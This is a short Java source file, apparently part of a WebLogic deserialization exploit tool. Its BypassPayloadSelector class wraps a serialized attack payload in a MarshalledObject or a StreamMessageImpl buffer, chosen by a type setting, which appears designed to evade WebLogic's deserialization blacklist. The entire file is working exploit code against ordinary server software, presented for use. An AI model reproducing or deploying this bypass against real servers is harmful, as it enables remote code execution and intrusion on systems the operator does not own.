package com.supeream.weblogic;

import com.supeream.Main;
import com.supeream.serial.Serializables;
import weblogic.corba.utils.MarshalledObject;
import weblogic.jms.common.StreamMessageImpl;

import java.io.IOException;

/**
 * Created by nike on 17/6/26.
 */
public class BypassPayloadSelector {

    private static Object marshalledObject(Object payload) {
        MarshalledObject marshalledObject = null;
        try {
            marshalledObject = new MarshalledObject(payload);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return marshalledObject;
    }


    public static Object streamMessageImpl(byte[] object) throws Exception {

        StreamMessageImpl streamMessage = new StreamMessageImpl();
        streamMessage.setDataBuffer(object, object.length);
        return streamMessage;
    }

    public static Object selectBypass(Object payload) throws Exception {

        if (Main.TYPE.equalsIgnoreCase("marshall")) {
            payload = marshalledObject(payload);
        } else if (Main.TYPE.equalsIgnoreCase("streamMessageImpl")) {
            payload = streamMessageImpl(Serializables.serialize(payload));
        }
        return payload;
    }


}
